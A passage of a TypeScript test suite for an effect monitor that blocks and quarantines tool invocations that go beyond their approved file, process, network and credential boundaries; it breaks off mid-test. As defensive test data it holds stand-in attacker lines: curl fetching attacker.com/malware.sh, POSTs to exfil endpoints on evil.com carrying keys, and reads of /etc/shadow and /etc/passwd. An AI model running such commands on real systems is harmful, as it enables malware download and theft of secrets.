import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type {
  ObservedEffectProfile,
  QualificationArtifactBundle,
  QualificationRunRecord,
  ToolManifest,
  ToolQualificationApproval,
} from "@resin/contracts";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import {
  BrokerAuditEmitter,
  BrokerSecurityError,
  CapabilityBrokerManager,
} from "../src/brokers/index.js";
import {
  EffectMonitor,
  type EffectRequest,
  type ExternalActionAuthorizationRecord,
  type ExternalActionAuthorizationVerifier,
  type QuarantineRecord,
  type RequalificationEvent,
  type VerifiedQualificationToken,
  computeExternalActionAuthorizationSigningPayload,
  computePayloadDigest,
  createEmptyApprovedBoundaries,
  deriveApprovedBoundaries,
  effectRequestToRecord,
  normalizeRelativePath,
  validateExternalActionAuthorization,
} from "../src/monitor/index.js";
import { matchesConsequentialNetworkAction } from "../src/monitor/index.js";
import {
  createVerifiedQualificationToken,
  getVerifiedQualificationData,
  isVerifiedQualificationToken,
  registerVerifiedHostObject,
} from "../src/monitor/token.js";
import { createInvocationGrant } from "../src/policy/grant.js";
import { ToolRuntime } from "../src/worker/runner.js";

describe("EffectMonitor, Qualification Boundaries & External Authorizations", () => {
  let tempWorkspace: string;
  let tempScratch: string;

  beforeAll(() => {
    tempWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), "effect_monitor_ws_"));
    tempScratch = fs.mkdtempSync(path.join(os.tmpdir(), "effect_monitor_scratch_"));

    fs.writeFileSync(path.join(tempWorkspace, "index.ts"), "console.log('hello');");
    fs.writeFileSync(path.join(tempWorkspace, "config.json"), JSON.stringify({ version: "1.0.0" }));
  });

  afterAll(() => {
    fs.rmSync(tempWorkspace, { recursive: true, force: true });
    fs.rmSync(tempScratch, { recursive: true, force: true });
  });

  const canonicalEmptyLockGraphDigest = computePayloadDigest({ package: {}, lock: {} });

  const sampleObservedProfile: ObservedEffectProfile = {
    filesRead: {
      observation: "complete",
      paths: ["index.ts", "package.json", "config.json"],
    },
    filesCreated: {
      observation: "complete",
      paths: ["dist/bundle.js", "dist/bundle.js.map"],
    },
    filesModified: {
      observation: "complete",
      paths: ["package.json"],
    },
    filesDeleted: {
      observation: "complete",
      paths: [],
    },
    processTree: {
      observation: "complete",
      spawnedProcesses: ["node", "esbuild", "tsc"],
    },
    network: {
      observation: "complete",
      destinations: ["api.github.com", "registry.npmjs.org", "127.0.0.1:8080"],
      methods: ["GET", "POST"],
    },
    environmentVariables: {
      observation: "complete",
      names: ["NODE_ENV", "PATH", "API_KEY", "BUILD_TARGET"],
    },
    credentials: {
      observation: "complete",
      names: ["GITHUB_TOKEN", "NPM_TOKEN"],
    },
    dependencyChanges: {
      observation: "complete",
      changes: [],
    },
    artifacts: {
      observation: "complete",
      items: [
        {
          name: "dist/bundle.js",
          digest: "1111111111111111111111111111111111111111111111111111111111111111",
        },
      ],
    },
    validationChecks: {
      observation: "complete",
      checks: [
        {
          checkId: "chk_syntax",
          name: "Syntax Validation",
          passed: true,
        },
      ],
    },
    resourceEnvelope: {
      observation: "complete",
      maxMemoryBytes: 256 * 1024 * 1024,
      cpuTimeMs: 1200,
      wallDurationMs: 3400,
    },
    consequentialActions: {
      observation: "complete",
      actions: [
        {
          actionType: "publish",
          target: "npm:@resin/test-tool",
          description: "Publish package to npm",
          requiresExplicitAuthorization: true,
        },
      ],
    },
  };

  const sampleQualificationBundle = {
    schemaVersion: "1.0.0",
    toolId: "tool_compiler",
    toolVersion: "1.0.0",
    sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
    depDigest: canonicalEmptyLockGraphDigest,
    schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
    intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
    approval: {
      schemaVersion: "1.0.0",
      toolId: "tool_compiler",
      toolVersion: "1.0.0",
      sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
      depDigest: canonicalEmptyLockGraphDigest,
      schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
      intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
      rawEvidenceDigest: "5555555555555555555555555555555555555555555555555555555555555555",
      approvalDigest: "7777777777777777777777777777777777777777777777777777777777777777",
      decision: "approved",
      approver: "security_lead",
      keyId: "key_prod_ed25519_1",
      signedAt: new Date().toISOString(),
      signature: {
        keyId: "key_prod_ed25519_1",
        algorithm: "ed25519",
        signature: "sig_mock_signature_bytes",
      },
    },
    frozenIntent: {
      intentId: "intent_001",
      schemaVersion: "1.0.0",
      toolId: "tool_compiler",
      toolVersion: "1.0.0",
      description: "Compile and bundle source code",
      intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
      capabilities: ["filesystem", "network", "command"],
      frozenAt: new Date().toISOString(),
    },
    runs: [
      {
        runId: "run_linux_001",
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        environmentDigest: "6666666666666666666666666666666666666666666666666666666666666666",
        observedEffects: sampleObservedProfile,
        replayedAt: new Date().toISOString(),
        success: true,
      },
    ],
    manifest: {
      name: "tool_compiler",
      version: "1.0.0",
      entrypoint: "dist/index.js",
      description: "Compiler tool",
      capabilities: ["filesystem", "network", "command"],
      dependencies: { esbuild: "^0.20.0" },
    },
    effectProfile: sampleObservedProfile,
  };

  const sampleVerifiedToken: VerifiedQualificationToken = createVerifiedQualificationToken({
    toolId: "tool_compiler",
    toolVersion: "1.0.0",
    sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
    depDigest: canonicalEmptyLockGraphDigest,
    schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
    intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
    approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
    runs: sampleQualificationBundle.runs as unknown as QualificationRunRecord[],
    effectProfile: sampleObservedProfile,
    manifest: sampleQualificationBundle.manifest as unknown as ToolManifest,
    dependencies: sampleQualificationBundle.manifest.dependencies,
    rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
  });

  const trustedKeyId = "key_trusted_auth_verifier_1";
  const validSignature = "sig_valid_cryptographic_signature_hex";

  const sampleAuthVerifier: ExternalActionAuthorizationVerifier = ({ keyId, signature }) => {
    return keyId === trustedKeyId && signature === validSignature;
  };

  describe("Boundary Derivation & Path Normalization", () => {
    it("derives approved boundaries exclusively from verified qualification token", () => {
      const boundaries = deriveApprovedBoundaries(sampleVerifiedToken);

      expect(boundaries.toolId).toBe("tool_compiler");
      expect(boundaries.toolVersion).toBe("1.0.0");
      expect(boundaries.sourceDigest).toBe(
        "3333333333333333333333333333333333333333333333333333333333333333",
      );
      expect(boundaries.filesRead.paths.has("index.ts")).toBe(true);
      expect(boundaries.filesCreated.paths.has("dist/bundle.js")).toBe(true);
      expect(boundaries.processTree.spawnedProcesses.has("esbuild")).toBe(true);
      expect(boundaries.network.destinations.has("api.github.com")).toBe(true);
      expect(boundaries.consequentialActions.actions.length).toBe(1);
    });

    it("rejects arbitrary unverified QualificationArtifactBundle with BrokerSecurityError (POLICY_VIOLATION)", () => {
      try {
        deriveApprovedBoundaries(sampleQualificationBundle);
        expect.unreachable("Should have thrown");
      } catch (err: unknown) {
        expect(err).toBeInstanceOf(BrokerSecurityError);
        expect((err as BrokerSecurityError).code).toBe("POLICY_VIOLATION");
      }
    });

    it("rejects arbitrary unverified ObservedEffectProfile with BrokerSecurityError (POLICY_VIOLATION)", () => {
      try {
        deriveApprovedBoundaries(sampleObservedProfile);
        expect.unreachable("Should have thrown");
      } catch (err: unknown) {
        expect(err).toBeInstanceOf(BrokerSecurityError);
        expect((err as BrokerSecurityError).code).toBe("POLICY_VIOLATION");
      }
    });

    it("rejects fabricated boundaries object with BrokerSecurityError (POLICY_VIOLATION)", () => {
      const fabricatedBoundaries = {
        filesRead: { observation: "complete", paths: ["/etc/shadow"] },
      };
      try {
        deriveApprovedBoundaries(fabricatedBoundaries);
        expect.unreachable("Should have thrown");
      } catch (err: unknown) {
        expect(err).toBeInstanceOf(BrokerSecurityError);
        expect((err as BrokerSecurityError).code).toBe("POLICY_VIOLATION");
      }
    });

    it("normalizes paths correctly and distinguishes workspace from scratch directory", () => {
      const p1 = normalizeRelativePath("src/index.ts", tempWorkspace);
      expect(p1.relativePath).toBe("src/index.ts");
      expect(p1.isScratch).toBe(false);

      const p2 = normalizeRelativePath("./package.json", tempWorkspace);
      expect(p2.relativePath).toBe("package.json");

      const p3 = normalizeRelativePath(path.join(tempWorkspace, "config.json"), tempWorkspace);
      expect(p3.relativePath).toBe("config.json");

      const p4 = normalizeRelativePath(
        path.join(tempScratch, "tmp.txt"),
        tempWorkspace,
        tempScratch,
      );
      expect(p4.relativePath).toBe("tmp.txt");
      expect(p4.isScratch).toBe(true);
    });
  });

  describe("Per-Invocation Monitoring & Enforcement with Verified Token", () => {
    it("passes expected effects cheaply when registered with verified token", () => {
      const emitter = new BrokerAuditEmitter();
      const quarantineFn = vi.fn();
      const requalifyFn = vi.fn();

      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        onQuarantine: quarantineFn,
        onRequalificationNeeded: requalifyFn,
      });

      monitor.registerInvocation({
        invocationId: "inv_fast_pass",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        workspaceRoot: tempWorkspace,
      });

      // 1. Approved file read
      const checkRead = monitor.checkBeforeEffect("inv_fast_pass", {
        type: "file_read",
        path: "index.ts",
      });
      expect(checkRead.allowed).toBe(true);

      // 2. Approved process spawn
      const checkCmd = monitor.checkBeforeEffect("inv_fast_pass", {
        type: "process_spawn",
        command: "esbuild",
        args: ["index.ts", "--bundle"],
      });
      expect(checkCmd.allowed).toBe(true);

      // 3. Approved network request
      const checkNet = monitor.checkBeforeEffect("inv_fast_pass", {
        type: "network_request",
        url: "https://api.github.com/repos",
        method: "GET",
      });
      expect(checkNet.allowed).toBe(true);

      // 4. Approved credential access
      const checkSecret = monitor.checkBeforeEffect("inv_fast_pass", {
        type: "credential_access",
        name: "GITHUB_TOKEN",
      });
      expect(checkSecret.allowed).toBe(true);

      expect(quarantineFn).not.toHaveBeenCalled();
      expect(requalifyFn).not.toHaveBeenCalled();
      expect(monitor.isInvocationRevoked("inv_fast_pass")).toBe(false);
    });

    it("rejects registration with arbitrary fabricated profile or unverified bundle", () => {
      const monitor = new EffectMonitor();

      expect(() => {
        monitor.registerInvocation({
          invocationId: "inv_fabricated_profile",
          toolId: "tool_compiler",
          boundaries: sampleObservedProfile as unknown as VerifiedQualificationToken,
        });
      }).toThrow(BrokerSecurityError);

      expect(() => {
        monitor.registerInvocation({
          invocationId: "inv_fabricated_bundle",
          toolId: "tool_compiler",
          boundaries: sampleQualificationBundle as unknown as VerifiedQualificationToken,
        });
      }).toThrow(BrokerSecurityError);
    });

    it("blocks and quarantines unobserved filesystem write, revoking invocation", () => {
      const emitter = new BrokerAuditEmitter();
      let capturedQuarantine: QuarantineRecord | null = null;

      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        onQuarantine: (record) => {
          capturedQuarantine = record;
        },
      });

      monitor.registerInvocation({
        invocationId: "inv_unobserved_write",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        workspaceRoot: tempWorkspace,
      });

      const check = monitor.checkBeforeEffect("inv_unobserved_write", {
        type: "file_write",
        path: "secret_exfiltration.txt",
        isCreate: true,
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("file_create");
      expect(monitor.isInvocationRevoked("inv_unobserved_write")).toBe(true);
      expect(capturedQuarantine).not.toBeNull();
      expect(capturedQuarantine?.violationType).toBe("file_create");
      expect(capturedQuarantine?.invocationId).toBe("inv_unobserved_write");
    });

    it("blocks and quarantines unobserved command / process execution", () => {
      const emitter = new BrokerAuditEmitter();
      let capturedQuarantine: QuarantineRecord | null = null;

      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        onQuarantine: (record) => {
          capturedQuarantine = record;
        },
      });

      monitor.registerInvocation({
        invocationId: "inv_unobserved_cmd",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });

      const check = monitor.checkBeforeEffect("inv_unobserved_cmd", {
        type: "process_spawn",
        command: "curl",
        args: ["https://attacker.com/malware.sh"],
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("process_spawn");
      expect(monitor.isInvocationRevoked("inv_unobserved_cmd")).toBe(true);
      expect(capturedQuarantine?.violationType).toBe("process_spawn");
    });

    it("blocks and quarantines unobserved network destination", () => {
      const emitter = new BrokerAuditEmitter();
      let capturedQuarantine: QuarantineRecord | null = null;

      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        onQuarantine: (record) => {
          capturedQuarantine = record;
        },
      });

      monitor.registerInvocation({
        invocationId: "inv_unobserved_net",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });

      const check = monitor.checkBeforeEffect("inv_unobserved_net", {
        type: "network_request",
        url: "https://unknown-attacker.org/exfil",
        method: "POST",
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("network_access");
      expect(monitor.isInvocationRevoked("inv_unobserved_net")).toBe(true);
      expect(capturedQuarantine?.violationType).toBe("network_access");
    });

    it("blocks unobserved credential access", () => {
      const emitter = new BrokerAuditEmitter();
      let capturedQuarantine: QuarantineRecord | null = null;

      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        onQuarantine: (record) => {
          capturedQuarantine = record;
        },
      });

      monitor.registerInvocation({
        invocationId: "inv_unobserved_cred",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });

      const check = monitor.checkBeforeEffect("inv_unobserved_cred", {
        type: "credential_access",
        name: "AWS_SECRET_ACCESS_KEY",
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("credential_access");
      expect(monitor.isInvocationRevoked("inv_unobserved_cred")).toBe(true);
      expect(capturedQuarantine?.violationType).toBe("credential_access");
    });
  });

  describe("External Action Authorization with Cryptographic Verifier", () => {
    const payload = { packageName: "@resin/test-tool", version: "1.0.0" };
    const payloadDigest = computePayloadDigest(payload);

    it("validates external action with valid cryptographic signature and injected verifier", () => {
      const validAuthRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      const result = validateExternalActionAuthorization(
        validAuthRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "npm:@resin/test-tool",
          payload,
        },
        { verifier: sampleAuthVerifier },
      );

      expect(result.valid).toBe(true);
    });

    it("denies external action if verifier is not injected", () => {
      const validAuthRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      const result = validateExternalActionAuthorization(
        validAuthRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "npm:@resin/test-tool",
          payload,
        },
        // no verifier injected
      );

      expect(result.valid).toBe(false);
      expect(result.reason).toContain("No trusted authorization verifier injected");
    });

    it("denies external action if signature is invalid / untrusted key", () => {
      const untrustedAuthRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: "unknown_key_id",
        signature: "forged_signature_hex",
      };

      const result = validateExternalActionAuthorization(
        untrustedAuthRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "npm:@resin/test-tool",
          payload,
        },
        { verifier: sampleAuthVerifier },
      );

      expect(result.valid).toBe(false);
      expect(result.reason).toContain("Cryptographic signature verification failed");
    });

    it("denies external action if authorization record is unsigned (missing keyId or signature)", () => {
      const unsignedAuthRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: "",
        signature: "",
      } as unknown as ExternalActionAuthorizationRecord;

      const result = validateExternalActionAuthorization(
        unsignedAuthRecord,
        {
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          actionType: "publish",
          target: "npm:@resin/test-tool",
          payload,
        },
        { verifier: sampleAuthVerifier },
      );

      expect(result.valid).toBe(false);
      expect(result.reason).toContain("missing required");
    });

    it("allows authorized external action when registered with valid signed record and verifier", () => {
      const monitor = new EffectMonitor({
        authorizationVerifier: sampleAuthVerifier,
      });

      const authRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      monitor.registerInvocation({
        invocationId: "inv_valid_auth",
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        boundaries: sampleVerifiedToken,
        externalAuthorizations: [authRecord],
      });

      const check = monitor.checkBeforeEffect("inv_valid_auth", {
        type: "external_action",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payload,
      });

      expect(check.allowed).toBe(true);
      expect(monitor.isInvocationRevoked("inv_valid_auth")).toBe(false);
    });

    it("rejects registration of unsigned or failing external authorization records with BrokerSecurityError", () => {
      const monitor = new EffectMonitor({
        authorizationVerifier: sampleAuthVerifier,
      });

      const unsignedAuthRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        // missing keyId and signature
      };

      expect(() => {
        monitor.registerInvocation({
          invocationId: "inv_unsigned_registration",
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          boundaries: sampleVerifiedToken,
          externalAuthorizations: [
            unsignedAuthRecord as unknown as ExternalActionAuthorizationRecord,
          ],
        });
      }).toThrow(BrokerSecurityError);

      const invalidSigAuthRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: "bad_key",
        signature: "bad_sig",
      };

      expect(() => {
        monitor.registerInvocation({
          invocationId: "inv_bad_sig_registration",
          toolId: "tool_compiler",
          toolVersion: "1.0.0",
          boundaries: sampleVerifiedToken,
          externalAuthorizations: [invalidSigAuthRecord],
        });
      }).toThrow(BrokerSecurityError);
    });

    it("blocks and revokes invocation when payload digest does not match authorization record", () => {
      const emitter = new BrokerAuditEmitter();
      let capturedQuarantine: QuarantineRecord | null = null;

      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        authorizationVerifier: sampleAuthVerifier,
        onQuarantine: (record) => {
          capturedQuarantine = record;
        },
      });

      const authorizedPayload = { packageName: "@resin/test-tool", version: "1.0.0" };
      const authorizedDigest = computePayloadDigest(authorizedPayload);

      const authRecord: ExternalActionAuthorizationRecord = {
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payloadDigest: authorizedDigest,
        approver: "security_officer_alice",
        expiresAt: new Date(Date.now() + 3600000).toISOString(),
        keyId: trustedKeyId,
        signature: validSignature,
      };

      monitor.registerInvocation({
        invocationId: "inv_digest_mismatch",
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        boundaries: sampleVerifiedToken,
        externalAuthorizations: [authRecord],
      });

      // Attempting to publish tampered payload with different version
      const tamperedPayload = { packageName: "@resin/test-tool", version: "1.0.1" };

      const check = monitor.checkBeforeEffect("inv_digest_mismatch", {
        type: "external_action",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payload: tamperedPayload,
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("external_action");
      expect(monitor.isInvocationRevoked("inv_digest_mismatch")).toBe(true);
      expect(capturedQuarantine).not.toBeNull();
      expect(capturedQuarantine?.violationType).toBe("external_action");
    });

    it("blocks external consequential action with no authorization and revokes session", () => {
      const emitter = new BrokerAuditEmitter();
      const monitor = new EffectMonitor({
        auditEmitter: emitter,
        authorizationVerifier: sampleAuthVerifier,
      });

      monitor.registerInvocation({
        invocationId: "inv_no_auth",
        toolId: "tool_compiler",
        toolVersion: "1.0.0",
        boundaries: sampleVerifiedToken,
      });

      const check = monitor.checkBeforeEffect("inv_no_auth", {
        type: "external_action",
        actionType: "publish",
        target: "npm:@resin/test-tool",
        payload: { packageName: "@resin/test-tool" },
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("external_action");
      expect(monitor.isInvocationRevoked("inv_no_auth")).toBe(true);
    });
  });

  describe("Audit Trail Redaction & Secret Protection", () => {
    it("redacts secret values, tokens, and payloads from audit events and effect summaries", () => {
      const emitter = new BrokerAuditEmitter();
      const monitor = new EffectMonitor({ auditEmitter: emitter });

      monitor.registerInvocation({
        invocationId: "inv_secret_audit",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
      });

      // Attempt forbidden secret access with sensitive URL and body
      monitor.checkBeforeEffect("inv_secret_audit", {
        type: "network_request",
        url: "https://evil.com/exfil?api_key=secret_12345&token=tok_98765",
        method: "POST",
        payload: {
          secret_key: "top_secret_value",
          nested: { password: "admin_password" },
        },
      });

      const history = emitter.getEvents();
      expect(history.length).toBeGreaterThan(0);

      const jsonStr = JSON.stringify(history);
      expect(jsonStr).not.toContain("secret_12345");
      expect(jsonStr).not.toContain("tok_98765");
      expect(jsonStr).not.toContain("top_secret_value");
      expect(jsonStr).not.toContain("admin_password");
      expect(jsonStr).toContain("[REDACTED]");
    });
  });

  describe("CapabilityBrokerManager & Integration with Verified Token", () => {
    it("integrates EffectMonitor with CapabilityBrokerManager and verified token", async () => {
      const manager = new CapabilityBrokerManager({
        workspaceRoot: tempWorkspace,
        scratchDir: tempScratch,
        requireGrant: false,
        authorizationVerifier: sampleAuthVerifier,
      });

      const invocationId = "inv_manager_integration";
      manager.registerInvocation({
        invocationId,
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        workspaceRoot: tempWorkspace,
      });

      // 1. Reading approved file via broker dispatch
      const readResult = await manager.handleRequest(
        "fs",
        "readFile",
        { path: path.join(tempWorkspace, "index.ts") },
        { invocationId, source: "worker", workspaceRoot: tempWorkspace, scratchDir: tempScratch },
      );
      expect(readResult).toBeDefined();

      // 2. Reading unapproved file triggers quarantine and revocation
      await expect(
        manager.handleRequest(
          "fs",
          "readFile",
          { path: "unapproved_secret.env" },
          { invocationId, source: "worker", workspaceRoot: tempWorkspace, scratchDir: tempScratch },
        ),
      ).rejects.toThrow(BrokerSecurityError);

      expect(manager.effectMonitor.isInvocationRevoked(invocationId)).toBe(true);
    });

    it("rejects fabricated profile registered through CapabilityBrokerManager", () => {
      const manager = new CapabilityBrokerManager({
        workspaceRoot: tempWorkspace,
      });

      expect(() => {
        manager.registerInvocation({
          invocationId: "inv_fabricated_mgr",
          toolId: "tool_compiler",
          boundaries: {
            filesRead: { observation: "complete", paths: ["/etc/passwd"] },
          } as unknown as VerifiedQualificationToken,
        });
      }).toThrow(BrokerSecurityError);
    });
  });

  describe("Replication Drift & Signature Serialization Helpers", () => {
    it("detects source code digest drift and triggers requalification callback", () => {
      let capturedRequalification: RequalificationEvent | null = null;

      const monitor = new EffectMonitor({
        onRequalificationNeeded: (event) => {
          capturedRequalification = event;
        },
      });

      monitor.registerInvocation({
        invocationId: "inv_source_drift",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        actualSourceDigest: "9999999999999999999999999999999999999999999999999999999999999999", // drift from 3333...
      });

      const session = monitor.getSession("inv_source_drift");
      expect(session?.status).toBe("drift_detected");
      expect(session?.requalificationRequired).toBe(true);
      expect(session?.driftReasons).toContain("source_drift");
      expect(capturedRequalification).not.toBeNull();
      expect(capturedRequalification?.reason).toBe("source_drift");
    });

    it("detects dependency drift and triggers requalification callback", () => {
      let capturedRequalification: RequalificationEvent | null = null;

      const monitor = new EffectMonitor({
        onRequalificationNeeded: (event) => {
          capturedRequalification = event;
        },
      });

      monitor.registerInvocation({
        invocationId: "inv_dep_drift",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        actualDependencies: {
          esbuild: "^0.21.0", // changed from ^0.20.0
          lodash: "^4.17.21", // added new dependency
        },
      });

      const session = monitor.getSession("inv_dep_drift");
      expect(session?.status).toBe("drift_detected");
      expect(session?.requalificationRequired).toBe(true);
      expect(session?.driftReasons).toContain("dependency_drift");
      expect(capturedRequalification).not.toBeNull();
      expect(capturedRequalification?.reason).toBe("dependency_drift");
    });

    it("detects dependency drift with readonly string array dependencies", () => {
      let capturedRequalification: RequalificationEvent | null = null;

      const monitor = new EffectMonitor({
        onRequalificationNeeded: (event) => {
          capturedRequalification = event;
        },
      });

      const expectedDeps: readonly string[] = Object.freeze(["esbuild@0.20.0", "typescript@5.4.0"]);
      const actualDeps: readonly string[] = Object.freeze(["esbuild@0.20.0", "lodash@4.17.21"]);

      monitor.registerInvocation({
        invocationId: "inv_dep_drift_readonly_array",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        dependencies: expectedDeps,
        actualDependencies: actualDeps,
      });

      const session = monitor.getSession("inv_dep_drift_readonly_array");
      expect(session?.status).toBe("drift_detected");
      expect(session?.requalificationRequired).toBe(true);
      expect(session?.driftReasons).toContain("dependency_drift");
      expect(capturedRequalification).not.toBeNull();
      expect(capturedRequalification?.reason).toBe("dependency_drift");
      expect(capturedRequalification?.details).toEqual({
        invocationId: "inv_dep_drift_readonly_array",
        drift: {
          added: ["lodash@4.17.21"],
          removed: ["typescript@5.4.0"],
        },
      });
    });

    it("detects dependency drift with readonly record dependencies", () => {
      let capturedRequalification: RequalificationEvent | null = null;

      const monitor = new EffectMonitor({
        onRequalificationNeeded: (event) => {
          capturedRequalification = event;
        },
      });

      const expectedRecord: Readonly<Record<string, string>> = Object.freeze({
        esbuild: "^0.20.0",
      });
      const actualRecord: Readonly<Record<string, string>> = Object.freeze({ esbuild: "^0.21.0" });

      monitor.registerInvocation({
        invocationId: "inv_dep_drift_readonly_record",
        toolId: "tool_compiler",
        boundaries: sampleVerifiedToken,
        dependencies: expectedRecord,
        actualDependencies: actualRecord,
      });

      const session = monitor.getSession("inv_dep_drift_readonly_record");
      expect(session?.status).toBe("drift_detected");
      expect(session?.requalificationRequired).toBe(true);
      expect(session?.driftReasons).toContain("dependency_drift");
      expect(capturedRequalification).not.toBeNull();
      expect(capturedRequalification?.reason).toBe("dependency_drift");
    });

    it("correctly serializes EffectRequest to standard record for auditing", () => {
      const effectReq: EffectRequest = {
        type: "credential_access",
        name: "API_KEY",
        customTag: "custom_meta",
      };
      const record = effectRequestToRecord(effectReq);
      expect(record.type).toBe("credential_access");
      expect(record.name).toBe("API_KEY");
      expect(record.customTag).toBe("custom_meta");
    });
  });

  describe("Findings 8, 9, 11: Fail-Closed Boundaries, Consequential Net Authorization, Payload Hashing", () => {
    const paymentProfile: ObservedEffectProfile = {
      ...sampleObservedProfile,
      network: {
        observation: "complete",
        destinations: ["api.github.com", "api.payments.com"],
        methods: ["GET", "POST"],
      },
      consequentialActions: {
        observation: "complete",
        actions: [
          {
            actionType: "charge",
            target: "https://api.payments.com/v1/charge",
            description: "Process credit card payment",
            requiresExplicitAuthorization: true,
          },
        ],
      },
    };

    const paymentVerifiedToken: VerifiedQualificationToken = createVerifiedQualificationToken({
      toolId: "payment_tool",
      toolVersion: "1.0.0",
      sourceDigest: "3333333333333333333333333333333333333333333333333333333333333333",
      depDigest: canonicalEmptyLockGraphDigest,
      schemaDigest: "efddc7bd8bbcef73a14eb1ace1ffdaec81e518ef1e13c1e9271d0b8acb694a49",
      intentDigest: "d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1",
      approval: sampleQualificationBundle.approval as unknown as ToolQualificationApproval,
      runs: [
        {
          ...sampleQualificationBundle.runs[0],
          observedEffects: paymentProfile,
        },
      ] as unknown as QualificationRunRecord[],
      effectProfile: paymentProfile,
      manifest: sampleQualificationBundle.manifest as unknown as ToolManifest,
      dependencies: {},
      rawBundle: sampleQualificationBundle as unknown as QualificationArtifactBundle,
    });

    it("Finding 9: fails closed for unregistered invocations without verified boundaries", async () => {
      const monitor = new EffectMonitor({ strict: true });

      const check = monitor.checkBeforeEffect("completely_unregistered_inv", {
        type: "file_read",
        path: "index.ts",
      });

      expect(check.allowed).toBe(false);
      expect(check.violationType).toBe("policy_violation");
      expect(check.reason).toContain("Unregistered invocation");

      const manager = new CapabilityBrokerManager({ strict: true, workspaceRoot: tempWorkspace });
      await expect(
        manager.handleRequest(
          "fs",
          "readFile",
